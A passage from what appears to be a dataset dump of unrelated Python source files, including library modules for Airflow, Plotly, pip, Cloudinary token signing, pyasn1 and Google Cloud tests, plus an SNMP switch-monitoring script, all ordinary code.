# At what time can we release the capsule to pass through all of the discs?
print(find_time(positions, starting))

# Part 2
# What if we add another disc at the bottom?
positions.append(11)
starting.append(0)
print(find_time(positions, starting))"
JY156	JY156-pygments.py	"""""""
Adaptor for building prompt_toolkit styles, starting from a Pygments style.

Usage::

    from pygments.styles.tango import TangoStyle
    style = style_from_pygments_cls(pygments_style_cls=TangoStyle)
""""""
from typing import TYPE_CHECKING, Dict, Type

from .style import Style

if TYPE_CHECKING:
    from pygments.style import Style as PygmentsStyle
    from pygments.token import Token


__all__ = [
    ""style_from_pygments_cls"",
    ""style_from_pygments_dict"",
    ""pygments_token_to_classname"",
]


def style_from_pygments_cls(pygments_style_cls: Type[""PygmentsStyle""]) -> Style:
    """"""
    Shortcut to create a :class:`.Style` instance from a Pygments style class
    and a style dictionary.

    Example::

        from prompt_toolkit.styles.from_pygments import style_from_pygments_cls
        from pygments.styles import get_style_by_name
        style = style_from_pygments_cls(get_style_by_name('monokai'))

    :param pygments_style_cls: Pygments style class to start from.
    """"""
    # Import inline.
    from pygments.style import Style as PygmentsStyle

    assert issubclass(pygments_style_cls, PygmentsStyle)

    return style_from_pygments_dict(pygments_style_cls.styles)


def style_from_pygments_dict(pygments_dict: Dict[""Token"", str]) -> Style:
    """"""
    Create a :class:`.Style` instance from a Pygments style dictionary.
    (One that maps Token objects to style strings.)
    """"""
    pygments_style = []

    for token, style in pygments_dict.items():
        pygments_style.append((pygments_token_to_classname(token), style))

    return Style(pygments_style)


def pygments_token_to_classname(token: ""Token"") -> str:
    """"""
    Turn e.g. `Token.Name.Exception` into `'pygments.name.exception'`.

    (Our Pygments lexer will also turn the tokens that pygments produces in a
    prompt_toolkit list of fragments that match these styling rules.)
    """"""
    parts = (""pygments"",) + token
    return ""."".join(parts).lower()"
JY289	JY289-event_log_schema.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from typing import NamedTuple

from marshmallow import Schema, fields
from marshmallow_sqlalchemy import SQLAlchemySchema, auto_field

from airflow.models.log import Log


class EventLogSchema(SQLAlchemySchema):
    """"""Event log schema.""""""

    class Meta:
        """"""Meta.""""""

        model = Log

    id = auto_field(data_key=""event_log_id"", dump_only=True)
    dttm = auto_field(data_key=""when"", dump_only=True)
    dag_id = auto_field(dump_only=True)
    task_id = auto_field(dump_only=True)
    event = auto_field(dump_only=True)
    execution_date = auto_field(dump_only=True)
    owner = auto_field(dump_only=True)
    extra = auto_field(dump_only=True)


class EventLogCollection(NamedTuple):
    """"""List of import errors with metadata.""""""

    event_logs: list[Log]
    total_entries: int


class EventLogCollectionSchema(Schema):
    """"""EventLog Collection Schema.""""""

    event_logs = fields.List(fields.Nested(EventLogSchema))
    total_entries = fields.Int()


event_log_schema = EventLogSchema()
event_log_collection_schema = EventLogCollectionSchema()"
JY53	JY53-urls.py	"import os
import string
import urllib.parse
import urllib.request
from typing import Optional

from .compat import WINDOWS


def get_url_scheme(url):
    # type: (str) -> Optional[str]
    if "":"" not in url:
        return None
    return url.split("":"", 1)[0].lower()


def path_to_url(path):
    # type: (str) -> str
    """"""
    Convert a path to a file: URL.  The path will be made absolute and have
    quoted path parts.
    """"""
    path = os.path.normpath(os.path.abspath(path))
    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))
    return url


def url_to_path(url):
    # type: (str) -> str
    """"""
    Convert a file: URL to a path.
    """"""
    assert url.startswith(
        ""file:""
    ), f""You can only turn file: urls into filenames (not {url!r})""

    _, netloc, path, _, _ = urllib.parse.urlsplit(url)

    if not netloc or netloc == ""localhost"":
        # According to RFC 8089, same as empty authority.
        netloc = """"
    elif WINDOWS:
        # If we have a UNC path, prepend UNC share notation.
        netloc = ""\\\\"" + netloc
    else:
        raise ValueError(
            f""non-local file URIs are not supported on this platform: {url!r}""
        )

    path = urllib.request.url2pathname(netloc + path)

    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".
    # This creates issues for path-related functions like io.open(), so we try
    # to detect and strip the leading slash.
    if (
        WINDOWS
        and not netloc  # Not UNC.
        and len(path) >= 3
        and path[0] == ""/""  # Leading slash to strip.
        and path[1] in string.ascii_letters  # Drive letter.
        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.
    ):
        path = path[1:]

    return path"
JD416	JD416-auth_token.py	"import hashlib
import hmac
import re
import time
from binascii import a2b_hex


AUTH_TOKEN_NAME = ""__cld_token__""
AUTH_TOKEN_SEPARATOR = ""~""
AUTH_TOKEN_UNSAFE_RE = r'([ ""#%&\'\/:;<=>?@\[\\\]^`{\|}~]+)'


def generate(url=None, acl=None, start_time=None, duration=None,
             expiration=None, ip=None, key=None, token_name=AUTH_TOKEN_NAME):

    if expiration is None:
        if duration is not None:
            start = start_time if start_time is not None else int(time.time())
            expiration = start + duration
        else:
            raise Exception(""Must provide either expiration or duration"")

    if url is None and acl is None:
        raise Exception(""Must provide either acl or url"")

    token_parts = []
    if ip is not None:
        token_parts.append(""ip="" + ip)
    if start_time is not None:
        token_parts.append(""st=%d"" % start_time)
    token_parts.append(""exp=%d"" % expiration)
    if acl is not None:
        acl_list = acl if type(acl) is list else [acl]
        acl_list = [_escape_to_lower(a) for a in acl_list] 
        token_parts.append(""acl=%s"" % ""!"".join(acl_list))
    to_sign = list(token_parts)
    if url is not None and acl is None:
        to_sign.append(""url=%s"" % _escape_to_lower(url))
    auth = _digest(AUTH_TOKEN_SEPARATOR.join(to_sign), key)
    token_parts.append(""hmac=%s"" % auth)
    return ""%(token_name)s=%(token)s"" % {""token_name"": token_name, ""token"": AUTH_TOKEN_SEPARATOR.join(token_parts)}


def _digest(message, key):
    bin_key = a2b_hex(key)
    return hmac.new(bin_key, message.encode('utf-8'), hashlib.sha256).hexdigest()


def _escape_to_lower(url):
    # There is a circular import issue in this file, need to resolve it in the next major release
    from cloudinary.utils import smart_escape
    escaped_url = smart_escape(url, unsafe=AUTH_TOKEN_UNSAFE_RE)
    escaped_url = re.sub(r""%[0-9A-F]{2}"", lambda x: x.group(0).lower(), escaped_url)
    return escaped_url"
JY446	JY446-svg.py	"# -*- coding: utf-8 -*-
# Copyright (C) 2006-2007 Søren Roug, European Environment Agency
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#
# Contributor(s):
#

from odf.namespaces import SVGNS
from odf.element import Element
from odf.draw import DrawElement

# Autogenerated
def DefinitionSrc(**args):
    args.setdefault('type', 'simple')
    return Element(qname = (SVGNS,'definition-src'), **args)

def Desc(**args):
    return Element(qname = (SVGNS,'desc'), **args)

def FontFaceFormat(**args):
    return Element(qname = (SVGNS,'font-face-format'), **args)

def FontFaceName(**args):
    return Element(qname = (SVGNS,'font-face-name'), **args)

def FontFaceSrc(**args):
    return Element(qname = (SVGNS,'font-face-src'), **args)

def FontFaceUri(**args):
    args.setdefault('type', 'simple')
    return Element(qname = (SVGNS,'font-face-uri'), **args)

def Lineargradient(**args):
    return DrawElement(qname = (SVGNS,'linearGradient'), **args)

def Radialgradient(**args):
    return DrawElement(qname = (SVGNS,'radialGradient'), **args)

def Stop(**args):
    return Element(qname = (SVGNS,'stop'), **args)

def Title(**args):
    return Element(qname = (SVGNS,'title'), **args)"
JD172	JD172-PageNotFound_pb2.py	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/PageNotFound.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/PageNotFound.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\""streamlit/proto/PageNotFound.proto\""!\n\x0cPageNotFound\x12\x11\n\tpage_name\x18\x01 \x01(\tb\x06proto3'
)




_PAGENOTFOUND = _descriptor.Descriptor(
  name='PageNotFound',
  full_name='PageNotFound',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='page_name', full_name='PageNotFound.page_name', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=38,
  serialized_end=71,
)

DESCRIPTOR.message_types_by_name['PageNotFound'] = _PAGENOTFOUND
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

PageNotFound = _reflection.GeneratedProtocolMessageType('PageNotFound', (_message.Message,), {
  'DESCRIPTOR' : _PAGENOTFOUND,
  '__module__' : 'streamlit.proto.PageNotFound_pb2'
  # @@protoc_insertion_point(class_scope:PageNotFound)
  })
_sym_db.RegisterMessage(PageNotFound)


# @@protoc_insertion_point(module_scope)"
JD194	JD194-charts.py	"""""""
Generate charts from gathered data.

Requires **matplotlib**.
""""""

from pympler.classtracker_stats import Stats

try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt

    def tracker_timespace(filename: str, stats: Stats) -> None:
        """"""
        Create a time-space chart from a ``Stats`` instance.
        """"""
        classlist = list(stats.index.keys())
        classlist.sort()

        for snapshot in stats.snapshots:
            stats.annotate_snapshot(snapshot)

        timestamps = [fp.timestamp for fp in stats.snapshots]
        offsets = [0] * len(stats.snapshots)
        poly_labels = []
        polys = []
        for clsname in classlist:
            pct = [fp.classes[clsname]['pct'] for fp in stats.snapshots
                   if fp.classes and clsname in fp.classes]
            if max(pct) > 3.0:
                sizes = [fp.classes[clsname]['sum'] for fp in stats.snapshots
                         if fp.classes and clsname in fp.classes]
                sizes = [float(x) / (1024 * 1024) for x in sizes]
                sizes = [offset + size for offset, size in zip(offsets, sizes)]
                poly = matplotlib.mlab.poly_between(timestamps, offsets, sizes)
                polys.append((poly, {'label': clsname}))
                poly_labels.append(clsname)
                offsets = sizes

        fig = plt.figure(figsize=(10, 4))
        axis = fig.add_subplot(111)

        axis.set_title(""Snapshot Memory"")
        axis.set_xlabel(""Execution Time [s]"")
        axis.set_ylabel(""Virtual Memory [MiB]"")

        totals = [float(x.asizeof_total) / (1024 * 1024)
                  for x in stats.snapshots]
        axis.plot(timestamps, totals, 'r--', label='Total')
        tracked = [float(x.tracked_total) / (1024 * 1024)
                   for x in stats.snapshots]
        axis.plot(timestamps, tracked, 'b--', label='Tracked total')

        for (args, kwds) in polys:
            axis.fill(*args, **kwds)
        axis.legend(loc=2)  # TODO fill legend
        fig.savefig(filename)

except ImportError:
    def tracker_timespace(filename: str, stats: Stats) -> None:
        pass"
JD80	JD80-rfc2986.py	"# coding: utf-8
#
# This file is part of pyasn1-modules software.
#
# Created by Joel Johnson with asn1ate tool.
# Modified by Russ Housley to add support for opentypes by importing
#   definitions from rfc5280 so that the same maps are used.
#
# Copyright (c) 2005-2019, Ilya Etingof <etingof@gmail.com>
# License: http://snmplabs.com/pyasn1/license.html
#
# PKCS #10: Certification Request Syntax Specification
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc2986.txt
#
from pyasn1.type import namedtype
from pyasn1.type import tag
from pyasn1.type import univ

from pyasn1_modules import rfc5280

MAX = float('inf')


AttributeType = rfc5280.AttributeType

AttributeValue = rfc5280.AttributeValue

AttributeTypeAndValue = rfc5280.AttributeTypeAndValue

Attribute = rfc5280.Attribute

RelativeDistinguishedName = rfc5280.RelativeDistinguishedName

RDNSequence = rfc5280.RDNSequence

Name = rfc5280.Name

AlgorithmIdentifier = rfc5280.AlgorithmIdentifier

SubjectPublicKeyInfo = rfc5280.SubjectPublicKeyInfo


class Attributes(univ.SetOf):
    pass


Attributes.componentType = Attribute()


class CertificationRequestInfo(univ.Sequence):
    pass


CertificationRequestInfo.componentType = namedtype.NamedTypes(
    namedtype.NamedType('version', univ.Integer()),
    namedtype.NamedType('subject', Name()),
    namedtype.NamedType('subjectPKInfo', SubjectPublicKeyInfo()),
    namedtype.NamedType('attributes',
                        Attributes().subtype(implicitTag=tag.Tag(
                            tag.tagClassContext, tag.tagFormatSimple, 0))
    )
)


class CertificationRequest(univ.Sequence):
    pass


CertificationRequest.componentType = namedtype.NamedTypes(
    namedtype.NamedType('certificationRequestInfo', CertificationRequestInfo()),
    namedtype.NamedType('signatureAlgorithm', AlgorithmIdentifier()),
    namedtype.NamedType('signature', univ.BitString())
)"
JY8	JY8-_utils.py	"# Copyright 2016 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import typing


# sys.maxsize:
# An integer giving the maximum value a variable of type Py_ssize_t can take.
MAX_WAIT = sys.maxsize / 2


def find_ordinal(pos_num: int) -> str:
    # See: https://en.wikipedia.org/wiki/English_numerals#Ordinal_numbers
    if pos_num == 0:
        return ""th""
    elif pos_num == 1:
        return ""st""
    elif pos_num == 2:
        return ""nd""
    elif pos_num == 3:
        return ""rd""
    elif 4 <= pos_num <= 20:
        return ""th""
    else:
        return find_ordinal(pos_num % 10)


def to_ordinal(pos_num: int) -> str:
    return f""{pos_num}{find_ordinal(pos_num)}""


def get_callback_name(cb: typing.Callable[..., typing.Any]) -> str:
    """"""Get a callback fully-qualified name.

    If no name can be produced ``repr(cb)`` is called and returned.
    """"""
    segments = []
    try:
        segments.append(cb.__qualname__)
    except AttributeError:
        try:
            segments.append(cb.__name__)
        except AttributeError:
            pass
    if not segments:
        return repr(cb)
    else:
        try:
            # When running under sphinx it appears this can be none?
            if cb.__module__:
                segments.insert(0, cb.__module__)
        except AttributeError:
            pass
        return ""."".join(segments)"
JY224	JY224-introspection.py	"import cx_Oracle

from django.db.backends.oracle.introspection import DatabaseIntrospection
from django.utils.functional import cached_property


class OracleIntrospection(DatabaseIntrospection):
    # Associating any OBJECTVAR instances with GeometryField. This won't work
    # right on Oracle objects that aren't MDSYS.SDO_GEOMETRY, but it is the
    # only object type supported within Django anyways.
    @cached_property
    def data_types_reverse(self):
        return {
            **super().data_types_reverse,
            cx_Oracle.OBJECT: ""GeometryField"",
        }

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # Querying USER_SDO_GEOM_METADATA to get the SRID and dimension information.
            try:
                cursor.execute(
                    'SELECT ""DIMINFO"", ""SRID"" FROM ""USER_SDO_GEOM_METADATA"" '
                    'WHERE ""TABLE_NAME""=%s AND ""COLUMN_NAME""=%s',
                    (table_name.upper(), description.name.upper()),
                )
                row = cursor.fetchone()
            except Exception as exc:
                raise Exception(
                    ""Could not find entry in USER_SDO_GEOM_METADATA ""
                    'corresponding to ""%s"".""%s""' % (table_name, description.name)
                ) from exc

            # TODO: Research way to find a more specific geometry field type for
            # the column's contents.
            field_type = ""GeometryField""

            # Getting the field parameters.
            field_params = {}
            dim, srid = row
            if srid != 4326:
                field_params[""srid""] = srid
            # Size of object array (SDO_DIM_ARRAY) is number of dimensions.
            dim = dim.size()
            if dim != 2:
                field_params[""dim""] = dim
        return field_type, field_params"
JY301	JY301-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""scatter.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY295	JY295-batch.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from airflow.providers.amazon.aws.links.base_aws import BASE_AWS_CONSOLE_LINK, BaseAwsLink


class BatchJobDefinitionLink(BaseAwsLink):
    """"""Helper class for constructing AWS Batch Job Definition Link""""""

    name = ""Batch Job Definition""
    key = ""batch_job_definition""
    format_str = (
        BASE_AWS_CONSOLE_LINK + ""/batch/home?region={region_name}#job-definition/detail/{job_definition_arn}""
    )


class BatchJobDetailsLink(BaseAwsLink):
    """"""Helper class for constructing AWS Batch Job Details Link""""""

    name = ""Batch Job Details""
    key = ""batch_job_details""
    format_str = BASE_AWS_CONSOLE_LINK + ""/batch/home?region={region_name}#jobs/detail/{job_id}""


class BatchJobQueueLink(BaseAwsLink):
    """"""Helper class for constructing AWS Batch Job Queue Link""""""

    name = ""Batch Job Queue""
    key = ""batch_job_queue""
    format_str = BASE_AWS_CONSOLE_LINK + ""/batch/home?region={region_name}#queues/detail/{job_queue_arn}"""
JD445	JD445-test_bucket.py	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.
import uuid


import google.auth
from google.cloud import batch_v1
from google.cloud import storage
import pytest

from .test_basics import _test_body
from ..create.create_with_mounted_bucket import create_script_job_with_bucket

PROJECT = google.auth.default()[1]
REGION = 'europe-north1'

TIMEOUT = 600  # 10 minutes

WAIT_STATES = {
    batch_v1.JobStatus.State.STATE_UNSPECIFIED,
    batch_v1.JobStatus.State.QUEUED,
    batch_v1.JobStatus.State.RUNNING,
    batch_v1.JobStatus.State.SCHEDULED,
}


@pytest.fixture
def job_name():
    return f""test-job-{uuid.uuid4().hex[:10]}""


@pytest.fixture()
def test_bucket():
    bucket_name = f""test-bucket-{uuid.uuid4().hex[:8]}""
    client = storage.Client()
    client.create_bucket(bucket_name, location=""eu"")

    yield bucket_name

    bucket = client.get_bucket(bucket_name)
    bucket.delete(force=True)


def _test_bucket_content(test_bucket):
    client = storage.Client()
    bucket = client.get_bucket(test_bucket)

    file_name_template = ""output_task_{task_number}.txt""
    file_content_template = ""Hello world from task {task_number}.\n""

    for i in range(4):
        blob = bucket.blob(file_name_template.format(task_number=i))
        content = blob.download_as_bytes().decode()
        assert content == file_content_template.format(task_number=i)


def test_bucket_job(job_name, test_bucket):
    job = create_script_job_with_bucket(PROJECT, REGION, job_name, test_bucket)
    _test_body(job, lambda: _test_bucket_content(test_bucket))"
JY393	JY393-settings.py	"import os
from six.moves import configparser

from tornado.options import Error


def parse_environment(self, final=True):
    for name in os.environ:
        normalized = self._normalize_name(name)
        normalized = normalized.lower()
        if normalized in self._options:
            option = self._options[normalized]
            if option.multiple:
                if not isinstance(os.environ[name], (list, str)):
                    raise Error(""Option %r is required to be a list of %s ""
                                ""or a comma-separated string"" %
                                (option.name, option.type.__name__))

            if type(os.environ[name]) == str and option.type != str:
                option.parse(os.environ[name])
            else:
                option.set(os.environ[name])


def parse_config_file(self, path, section, final=True):
    try:
        config_parser = configparser.ConfigParser(interpolation=None)
    except TypeError:
        config_parser = configparser.ConfigParser()

    if not config_parser.read(path):
        raise IOError('Config file at path ""{}"" not found'.format(path))

    try:
        config = config_parser.items(section)
    except KeyError:
        raise ValueError('Config file does not have [{}] section]'.format(section))

    for (name, value) in config:
        normalized = self._normalize_name(name)
        normalized = normalized.lower()
        if normalized in self._options:
            option = self._options[normalized]
            if option.multiple:
                if not isinstance(value, (list, str)):
                    raise Error(""Option %r is required to be a list of %s ""
                                ""or a comma-separated string"" %
                                (option.name, option.type.__name__))

            if type(value) == str and option.type != str:
                option.parse(value)
            else:
                option.set(value)"
JD155	JD155-snmp_alteon_switch.py	"from pysnmp.hlapi import *

# Alteon Application Switch 3408
# /cfg/sys/ssnmp/cur
# /cfg/sys/ssnmp/snmpv3/cur

# # SNMP 프로토콜 정보
host = 'switch.ip.address'
read_community = 'public'
# write_community = 'private'

# https://www.ibm.com/docs/ko/taddm/7.3.0?topic=sensors-snmp-mib2-sensor
# https://support.radware.com/app/answers/answer_view/a_id/16176/~/alteon-recommended-oids-for-snmp-monitoring
# 현재 장비 버전 /info/sys/general
# Software Version 22.0.7.1
# https://support.radware.com/ci/okcsFattach/get/16176_5
# Alteon version 29.5 MIB
# oid = '.1.3.6.1.4.1.1872.2.5.4.2.5.1.0'  # The maximum number entries in the session table
oid = '.1.3.6.1.4.1.1872.2.5.4.2.5.2.0'  # The Current Number of session in the session table
# oid = '.1.3.6.1.4.1.1872.2.5.4.2.5.3.0'  # The Current Number of session in the session table in the last 4 seconds
identity = ObjectIdentity(oid)

# https://www.circitor.fr/Mibs/Html/S/SNMPv2-MIB.php#sysUpTime
# identity = ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)  # Nortel Application Switch 3408
# identity = ObjectIdentity('SNMPv2-MIB', 'sysObjectID', 0)  # SNMPv2-SMI::enterprises.1872.1.13.2.1

# # SNMPv3 보안 인증 정보
# user = 'v1v2only'  # 사용자 이름
# auth_key = None  # 인증 암호
# priv_key = None  # 암호화 암호
#
# # SNMPv3 설정
# snmpv3_user = UsmUserData(userName=user)

gen_snmp = getCmd(
    SnmpEngine(),
    CommunityData(communityIndex=read_community, mpModel=0),  # SNMPv1, SNMPv2c
    # authData=snmpv3_user,  # SNMPv3
    UdpTransportTarget((host, 161), timeout=5, retries=1),
    ContextData(),
    ObjectType(identity),
)

for (errorIndication,
     errorStatus,
     errorIndex,
     varBinds) in gen_snmp:
    if errorIndication:
        print(errorIndication)
    elif errorStatus:
        print('%s at %s' % (errorStatus.prettyPrint(), errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
    else:
        for varBind in varBinds:
            print(' = '.join([x.prettyPrint() for x in varBind]))"
JD393	JD393-PubSubToGCS_test.py	"# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

from apache_beam.io.gcp.gcsio import GcsIO
from apache_beam.testing.test_pipeline import TestPipeline
from apache_beam.testing.test_stream import TestStream
from apache_beam.testing.test_utils import TempDir
from apache_beam.transforms.window import TimestampedValue
import mock

import PubSubToGCS

PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]
BUCKET = os.environ[""CLOUD_STORAGE_BUCKET""]
UUID = uuid.uuid1().hex


@mock.patch(""apache_beam.Pipeline"", TestPipeline)
@mock.patch(
    ""apache_beam.io.ReadFromPubSub"",
    lambda topic: (
        TestStream()
        .advance_watermark_to(0)
        .advance_processing_time(30)
        .add_elements([TimestampedValue(b""a"", 1575937195)])
        .advance_processing_time(30)
        .add_elements([TimestampedValue(b""b"", 1575937225)])
        .advance_processing_time(30)
        .add_elements([TimestampedValue(b""c"", 1575937255)])
        .advance_watermark_to_infinity()
    ),
)
def test_pubsub_to_gcs():
    PubSubToGCS.run(
        input_topic=""unused"",  # mocked by TestStream
        output_path=f""gs://{BUCKET}/pubsub/{UUID}/output"",
        window_size=1,  # 1 minute
        num_shards=1,
        pipeline_args=[
            ""--project"",
            PROJECT,
            ""--temp_location"",
            TempDir().get_path(),
        ],
    )

    # Check for output files on GCS.
    gcs_client = GcsIO()
    files = gcs_client.list_prefix(f""gs://{BUCKET}/pubsub/{UUID}"")
    assert len(files) > 0

    # Clean up.
    gcs_client.delete_batch(list(files))"
JD149	JD149-zip_status.py	"from time import time

from bot import DOWNLOAD_DIR, LOGGER
from bot.helper.ext_utils.bot_utils import get_readable_file_size, MirrorStatus, EngineStatus, get_readable_time
from bot.helper.ext_utils.fs_utils import get_path_size

class ZipStatus:
    def __init__(self, name, size, gid, listener):
        self.__name = name
        self.__size = size
        self.__gid = gid
        self.__listener = listener
        self.__uid = listener.uid
        self.__start_time = time()
        self.message = listener.message

    def gid(self):
        return self.__gid

    def speed_raw(self):
        return self.processed_bytes() / (time() - self.__start_time)

    def progress_raw(self):
        try:
            return self.processed_bytes() / self.__size * 100
        except:
            return 0

    def progress(self):
        return f'{round(self.progress_raw(), 2)}%'

    def speed(self):
        return f'{get_readable_file_size(self.speed_raw())}/s'

    def name(self):
        return self.__name

    def size_raw(self):
        return self.__size

    def size(self):
        return get_readable_file_size(self.__size)

    def eta(self):
        try:
            seconds = (self.size_raw() - self.processed_bytes()) / self.speed_raw()
            return f'{get_readable_time(seconds)}'
        except:
            return '-'

    def status(self):
        return MirrorStatus.STATUS_ARCHIVING

    def processed_bytes(self):
        if self.__listener.newDir:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}10000"")
        else:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}"") - self.__size

    def download(self):
        return self

    def cancel_download(self):
        LOGGER.info(f'Cancelling Archive: {self.__name}')
        if self.__listener.suproc is not None:
            self.__listener.suproc.kill()
        self.__listener.onUploadError('archiving stopped by user!')

    def eng(self):
        return EngineStatus.STATUS_ZIP"
JD140	JD140-_line.py	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
JD18	JD18-console.py	"""""""
Simple console example that echos the input converted to uppercase.
""""""

import sys
import asyncio

from typing import Callable

from bacpypes3.settings import settings
from bacpypes3.debugging import bacpypes_debugging, ModuleLogger
from bacpypes3.argparse import ArgumentParser
from bacpypes3.console import Console, ConsolePDU
from bacpypes3.comm import Server, bind

# some debugging
_debug = 0
_log = ModuleLogger(globals())


@bacpypes_debugging
class Echo(Server[ConsolePDU]):
    """"""
    This example server echos downstream strings as uppercase strings going
    upstream.  If the PDU is None the console is finished, and this could send
    an integer status code upstream to exit.
    """"""

    _debug: Callable[..., None]

